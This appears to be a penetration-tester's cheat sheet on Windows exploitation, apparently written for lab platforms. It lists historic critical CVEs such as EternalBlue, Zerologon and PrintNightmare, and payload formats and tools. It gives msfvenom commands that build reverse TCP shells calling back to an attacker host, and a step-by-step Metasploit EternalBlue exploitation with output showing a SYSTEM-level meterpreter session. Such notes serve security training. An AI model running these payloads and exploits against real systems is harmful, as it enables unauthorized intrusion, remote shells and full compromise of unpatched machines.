# System Exploitation - Windows
## Prominent Vulnerabilities (The "Big Hits")
**Context:** Before diving into complex chains, check for these historic critical vulnerabilities. If present, they often provide instant `SYSTEM` or `Domain Admin` access.

| **Vulnerability**  | **CVE / MS-ID**  | **Service** | **Description**                                                                                     |
| ------------------ | ---------------- | ----------- | --------------------------------------------------------------------------------------------------- |
| *MS08-067*       | `CVE-2008-4250`  | SMB         | **Critical RCE.** The vulnerability used by Conficker. Reliable on XP/Server 2003.                  |
| *EternalBlue*    | `MS17-010`       | SMBv1       | **Critical RCE.** Leaked NSA tool. Remote execution as `SYSTEM`. Used by WannaCry.                  |
| *BlueKeep*       | `CVE-2019-0708`  | RDP         | **Critical RCE.** Pre-authentication vulnerability in Remote Desktop Services.                      |
| *SigRed*         | `CVE-2020-1350`  | DNS         | **Domain Admin.** RCE in Windows DNS Server (parsing malicious packets).                            |
| *Zerologon*      | `CVE-2020-1472`  | Netlogon    | **Domain Admin.** Cryptographic flaw allowing an unauthenticated attacker to reset the DC password. |
| *PrintNightmare* | `CVE-2021-34527` | Spooler     | **RCE / LPE.** Vulnerability in the Print Spooler service.                                          |
| *SeriousSam*     | `CVE-2021-36924` | SAM         | **LPE.** (HiveNightmare) Allows low-priv users to read the SAM hive (hashes) from Shadow Copies.    |
## Windows Payload Types
**Context:** When generating payloads (e.g., with MSFVenom), choosing the right format is critical for execution and evasion.
- **PowerShell (.ps1):** The modern standard. Supports .NET integration, memory-only execution (Fileless), and heavy automation.
- **DLL (.dll):** Dynamic Link Libraries. Used for **DLL Injection** or **DLL Hijacking** to escalate privileges or hide within legitimate processes.
- **MSI (.msi):** Installer Database. Executed via `msiexec /q /i payload.msi`. Can be configured to trigger a high-privilege shell during the installation process (AlwaysInstallElevated).
- **Batch (.bat):** Simple DOS commands. Good for basic automation or initial "stagers" to download the real payload.
- **VBScript (.vbs):** Legacy scripting. Historically used in Phishing (Office Macros).
## Payload Generation Tools
- **MSFVenom:** The industry standard for generating shellcode and executables.
- **PayloadsAllTheThings:** (GitHub) A repository of manual payloads for every scenario.
- **Nishang:** A framework of PowerShell scripts for offensive security (Reverse shells, enumeration).
- **Mythic C2:** A modern, multi-user Command & Control framework (Team Server).
### MSFVenom Quick Reference
```shell
# Windows Reverse TCP Shell (Exe)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=<PORT> -f exe > shell.exe

# Windows Reverse TCP Shell (PowerShell)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f ps1 > shell.ps1
```
## Case Study: MS17-010 (EternalBlue)
**Target:** Windows 7 / Server 2008 / Server 2012 (Unpatched SMBv1) 
**Risk:** **High.** This exploit can crash the target (BSOD) if the wrong grooming packet is sent. Use the `psexec` version for better stability.
### 1. Detection (Nmap)
Before attacking, verify the vulnerability exists to avoid crashing a healthy server.
```shell
nmap -p 445 --script smb-vuln-ms17-010 10.129.2.15
```
### 2. Exploitation (Metasploit)
```shell
# 1. Search for the module
msf6 > search eternal

# 2. Select the Psexec version (More stable than 'eternalblue_doublepulsar')
msf6 > use exploit/windows/smb/ms17_010_psexec

# 3. Configure Options
msf6 > set RHOSTS 10.129.2.15       # Target IP
msf6 > set LHOST 10.10.14.5        # Your VPN IP
msf6 > set LPORT 4444              # Listener Port

# 4. (Optional) Set Payload
# Usually defaults to meterpreter/reverse_tcp, but good to be explicit.
msf6 > set PAYLOAD windows/x64/meterpreter/reverse_tcp

# 5. Exploit
msf6 > exploit

# Success Output:
# [*] Meterpreter session 1 opened (10.10.14.5:4444 -> 10.129.2.15:49158)
# meterpreter > getuid
# Server username: NT AUTHORITY\SYSTEM
```